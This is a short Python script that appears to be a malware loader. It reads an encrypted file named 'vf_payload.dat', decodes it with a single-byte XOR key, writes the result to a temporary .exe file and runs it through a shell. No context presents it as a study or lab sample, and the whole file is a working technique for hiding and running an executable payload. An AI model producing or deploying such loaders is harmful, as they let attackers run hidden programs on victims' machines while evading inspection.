
import ctypes, os

def xor_decrypt(data, key=0x5A):
    return bytes([b ^ key for b in data])

def run():
    try:
        with open("vf_payload.dat", "rb") as f:
            encrypted = f.read()
        decrypted = xor_decrypt(encrypted)

        # Create temp file
        import tempfile, subprocess
        with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp:
            tmp.write(decrypted)
            tmp_path = tmp.name

        subprocess.Popen(tmp_path, shell=True)
    except Exception as e:
        print(f"Error during execution: {e}")
